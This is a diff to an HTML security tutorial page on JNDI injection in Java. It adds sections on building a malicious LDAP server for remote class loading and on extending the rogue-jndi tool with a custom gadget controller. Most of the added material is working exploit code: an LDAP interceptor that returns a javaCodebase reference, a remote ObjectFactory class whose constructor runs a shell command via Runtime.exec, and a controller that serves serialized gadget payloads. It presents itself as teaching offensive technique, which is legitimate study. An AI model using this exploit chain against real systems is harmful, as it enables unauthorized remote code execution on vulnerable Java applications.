@@ -20,6 +20,7 @@ layout: default
             <li>Mitigation</li>
             <li>Root Cause Analysis</li>
             <li>Building your Own Malicious LDAP Server</li>
+            <li>Modifying Existing Tools</li>
         </ul>
         <h3 style="text-align: left;">What is JNDI Injection:</h3>
         <div>JNDI stands for Java Naming Directory.</div>
@@ -237,7 +238,7 @@ layout: default
         <h3 style="text-align: left;">Building your Own Malicious LDAP Server</h3>
         <i><b>Note:</b>In real life exploitation you may not find any of the ysoserial gadget working.
         <br>At that time you need a custom gadget and should be able to integrate that gadget with your own malicous server or available tools.
-    <br>So learning how to build your own Malicious server can you help you with both the cases.</i>
+    <br>So learning how to build your own Malicious server can  help you with both the cases.</i>
         <div><p>The Ldap server can be built for 2 purpose</p>
         <ul><li>For remote class loading</li>
         <li>For sending Seriliased Data that uses Gadgets present in the class path to Acived RCE</li></ul></div>
@@ -418,14 +419,171 @@ public class ldaptest {
 </p>
 
 <div><h4>For Remote Class Loading:</h4></div>
-        <p>Thats it for Today.</p>
-<p>Thanks For Reading.</p>
-<p>Happy Hacking.</p>
-<p>You can connect with me at:</p>
+<p>For remote class loading we have to change the malicousServerEntryAndResponse() as below.  </p>
+<p>
+    <code>
+        <pre>
+            InMemoryDirectoryServerConfig malicousServerEntryAndResponse(byte[] decodedBytes) throws LDAPException
+                {
+                InMemoryDirectoryServerConfig config=serverConfiguration();
+
+
+
+                //Itnercepting the Call and sending Malcious Response
+                config.addInMemoryOperationInterceptor(new InMemoryOperationInterceptor() {
+                    @Override
+                    public void processSearchResult(InMemoryInterceptedSearchResult result) {
+                        ReadOnlySearchRequest request = result.getRequest();
+                        if (request.getBaseDN().toString().equalsIgnoreCase("o=custom")) {
+                            System.out.println("Inside Malicious EntryFucntion() on custome thing");
+                            Entry entry = new Entry("o=custom");
+                            entry.addAttribute("objectClass", "javaNamingReference");
+                            entry.addAttribute("javaClassName", "java.lang.String"); //could be any unknown
+                            entry.addAttribute("javaFactory", "testObject"); //could be any unknown
+                            entry.addAttribute("javaCodebase", "http://localhost:9004/");
+                            //entry.addAttribute("javaSerializedData", decodedBytes);
+                            System.out.println("service Response");
+                            try {
+                                result.sendSearchEntry(entry);
+                                result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
+                            } catch (LDAPException e) {
+                                e.printStackTrace();
+                            }
+                        } else {
+                            result.setResult(new LDAPResult(0, ResultCode.NO_SUCH_OBJECT));
+                        }
+                    }
+                });
+
+
+                return config;
+    }
+        </pre>
+    </code>
+</p>
+<p>
+    we have added 4 new entires and removed the javaSerializedData attribute.
+    <ol>
+        <li>objectClass=javaNamingReference</li>
+        <li>javaClassName=java.lang.String //could be any unknown</li>
+        <li>javaFactory",="testObject" //could be any unknown</li>
+        <li>javaCodebase"= "http://localhost:9004/"</li>
+                            
+    </ol>
+</p>
+<p> Now the Vulnerable application is going to fetch the http://localhost:9004/testObject.class</p>
+<p>So you need to have testObject.class ready On your server</p>
+<p>The testObject class should implement  javax.naming.spi.ObjectFactory and should override the getObjectInstance()</p>
+<p>The code you want to execute should be inside the default constructor.</p>
+
+<p>inshort the testObject.class code should look like below</p>
+<p>
+    <code>
+        <pre>
+import java.lang.*;
+import javax.naming.Context;
+import javax.naming.Name;
+import java.io.InputStream;
+import java.io.OutputStream;
+import java.net.Socket;
+import java.util.Hashtable;
+public class testObject implements javax.naming.spi.ObjectFactory
+{
+    public testObject()
+    {
+        try{
+        Runtime.getRuntime().exec("touch /tmp/pwnedViaRemoteReference");
+    }catch(Exception e)
+    {
+        e.printStackTrace();
+    }
+}
+@Override
+    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) {
+        return null;
+    }
+}
+        </pre>
+    </code>
+</p>
+
+<h3 style="text-align: left;">Modifying Existing Tools</h3>
+<div>
+    <p>Although it is not difficult to build own malicious server , it is often easier to modify the exsting to full fill your exploitation Requirements </p>
+</div>
+<div><p>So lets analyse how to modify some existing tools such as <a href="https://github.com/veracode-research/rogue-jndi">Rogue JNDI server From Veracode</a></p></div>
+<p>Lets take WebSphere1.java to understand how to build our own Ldaper Mapper where we can add our gadget</p>
+<div>
+    If you see there few thing on the webSphere1.java
+    <ol>
+        <li>An Custom Annotation @LdapMapping</li>
+        This attribute takes the url which is like the attribute the vulnrable application is either going to lookup() or search() for.
+        <li>The Class implements LDAPCOntroller and the sendReuslt Function takes InMemoryInterceptedSearchResult as input</li>
+        This result is then used to send the response back the user
+        <li>In side the sendResult() we see 2 key things
+            <ul>
+                <li><code><pre>e.addAttribute("javaClassName", "java.lang.String");</pre></code></li>
+                <li><code><pre>e.addAttribute("javaSerializedData", serialize(ref));</pre></code></li>
+            </ul>
+        </li>
+        The rest are the gadget used(WebSphere1 gadget).
+        javaSerializedData is being used to send the serialize ref which === Sending the serialized gadget data
+    </ol>
+</div>
+<p>
+    So assuming we do not have any well known gadget in the class path and we have to custom make our gadget and want to integrate it with the above ldap server , we can follow below steps.
+</p>
+<ul>
+    <li>
+        Create a file called custom.java under the controller directory.
+    </li>
+    <li>
+        Copy paste the below code
+        <code>
+            <pre>
+                package artsploit.controllers;
+                import artsploit.annotations.LdapMapping;
+                import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
+                import com.unboundid.ldap.sdk.Entry;
+                import com.unboundid.ldap.sdk.LDAPResult;
+                import com.unboundid.ldap.sdk.ResultCode;
+                import java.util.Base64;
+                @LdapMapping(uri = { "/o=custom"})
+                public class custom implements LdapController {
+                
+                    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
+                        Entry e = new Entry(base);
+                        System.out.println(base);
+                        e.addAttribute("javaClassName", "java.lang.String"); //could be anything
+                        String ser_data="base64 encoded serialized Gadget Data";
+                        byte[] decodedBytes = Base64.getDecoder().decode(ser_data);
+                        e.addAttribute("javaSerializedData",decodedBytes );
+                        System.out.println("Data sent");
+                    
+                        result.sendSearchEntry(e);
+                        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
+                    }
+                }
+
+            </pre>
+        </code>
+    </li>
+    <li>Recomplie the Application
+        <code><pre>mvn clean package</pre></code>
+    </li>
+</ul>
+<p>Now you can see that our custom mapper is ready to exploit.</p>
+<p><img src="images/jndiInjection/CustomRogueJNDICode.PNG"></p>
+
+
+
+<br>
+<br>
+<p><b>Thats it For Today.</b></p>
+<p><b>Thanks For Reading.</b></p>
+<p><b>Happy Hacking.</b></p>
+<p><b>You can connect with me at:</b></p>
 <p><a href="https://www.linkedin.com/in/swagatkumar/">Linkedin</a></p>
 <p><a href="https://x.com/webspl01t3r">Twitter</a></p>
-
-
-
-    </body>
+</body>
 </html>
